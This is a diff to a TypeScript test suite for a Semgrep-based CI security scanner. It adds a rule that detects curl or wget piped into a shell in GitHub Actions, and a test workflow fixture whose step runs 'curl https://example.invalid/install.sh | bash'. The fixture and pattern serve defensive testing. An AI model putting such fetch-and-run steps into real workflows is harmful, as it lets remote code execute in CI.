@@ -32,6 +32,66 @@ const EVAL_RULE = [
   '',
 ].join('\n');
 
+// Authentic p/default rule x8UAgrE, version 9lT3zYb (2026-10-07).
+// https://semgrep.dev/r/yaml.github-actions.security.gha-curl-pipe-shell.gha-curl-pipe-shell
+// Keep its matching patterns unchanged: excluding this rule would hide the regression.
+const CURL_RULE_ID = 'yaml.github-actions.security.gha-curl-pipe-shell.gha-curl-pipe-shell';
+const CURL_RULE = `rules:
+- id: ${CURL_RULE_ID}
+  languages: [yaml]
+  message: A run step pipes curl or wget directly into a shell interpreter.
+  severity: ERROR
+  patterns:
+  - pattern-inside: 'steps: [...]'
+  - pattern-inside: |
+      - run: ...
+        ...
+  - pattern: 'run: $SHELL'
+  - metavariable-pattern:
+      language: bash
+      metavariable: $SHELL
+      patterns:
+      - pattern-either:
+        - pattern: curl ... | $CMD ...
+        - pattern: wget ... | $CMD ...
+      - metavariable-regex:
+          metavariable: $CMD
+          regex: ^(bash|sh|python3?|ruby|perl)$
+`;
+
+// Real self-dogfood.yml reporting step: Semgrep 1.128.1 misparses the Unicode
+// shell strings and emits an Internal matching error, not a malformed YAML error.
+const UNCHANGED_WORKFLOW = `name: Unchanged workflow
+on: workflow_dispatch
+jobs:
+  review:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Report that no review will run
+        if: steps.probe.outputs.reviewable != 'true'
+        env:
+          REASON: \${{ steps.probe.outputs.reason }}
+        run: |
+          {
+            echo "### 🤖 Self-Dogfood Review"
+            echo ""
+            echo "⚪ NOT MEASURED — \${REASON}."
+            echo ""
+            echo "The review and triage jobs are skipped rather than passed, so their"
+            echo "checks are gray rather than green: nothing ran and the record says"
+            echo "so (#4919, #5878)."
+          } >> "$GITHUB_STEP_SUMMARY"
+`;
+
+const INTRODUCED_WORKFLOW = `name: Introduced unsafe install
+on: workflow_dispatch
+jobs:
+  install:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl https://example.invalid/install.sh | bash
+`;
+
 interface Fixture {
   readonly directory: string;
   readonly target: string;
@@ -40,13 +100,18 @@ interface Fixture {
 }
 
 /** Plumbing creates an immutable fixture base without checkout or git commit. */
-async function createFixture(): Promise<Fixture> {
+async function createFixture(
+  files: Readonly<Record<string, string>> = {
+    'app.ts': 'export const answer = 42;\n',
+    'partial.ts': PARTIAL_SOURCE,
+  },
+  ruleSource = EVAL_RULE
+): Promise<Fixture> {
   const directory = await mkdtemp(join(tmpdir(), 'baseline-semgrep-'));
   const target = join(directory, 'source');
   const rules = join(directory, 'rule.yaml');
   await mkdir(target);
-  await writeFile(rules, EVAL_RULE);
-  const files = { 'app.ts': 'export const answer = 42;\n', 'partial.ts': PARTIAL_SOURCE };
+  await writeFile(rules, ruleSource);
   const env = {
     ...hermeticGitEnv(),
     GIT_AUTHOR_NAME: 'Security fixture',
@@ -146,5 +211,31 @@ describe.skipIf(scannerAbsent)(suiteName, () => {
       blockingFindings: [],
     });
     expect(result.comparison?.errors.join('\n')).toContain('partial.ts');
+  }, 60_000);
+
+  it('blocks a real introduced curl-to-shell workflow while an unchanged workflow has matching errors (#7294)', async () => {
+    await rm(fixture.directory, { recursive: true, force: true });
+    fixture = await createFixture({ 'unchanged.yml': UNCHANGED_WORKFLOW }, CURL_RULE);
+    await writeFile(join(fixture.target, 'introduced.yml'), INTRODUCED_WORKFLOW);
+
+    const result = await scan();
+
+    expect(result.verdict, JSON.stringify(result.comparison)).toBe('fail');
+    expect(result.comparison).toMatchObject({
+      complete: true,
+      introducedBlockingCount: 1,
+      scannerVersion: probe.stdout.trim(),
+      errors: [],
+    });
+    expect(result.comparison?.blockingFindings).toEqual([
+      expect.objectContaining({ rule: CURL_RULE_ID, file: 'introduced.yml', severity: 'high' }),
+    ]);
+    const coverage = result.comparison?.unscannedCoverage?.join('\n') ?? '';
+    expect(coverage).toContain('unchanged.yml');
+    expect(coverage).toContain('Internal matching error');
+    expect(coverage).toContain(CURL_RULE_ID);
+    expect(coverage.toLowerCase()).toContain('semgrep');
+    expect(result.details).toContain('unscanned');
+    expect(result.details).toContain('unchanged.yml');
   }, 60_000);
 });
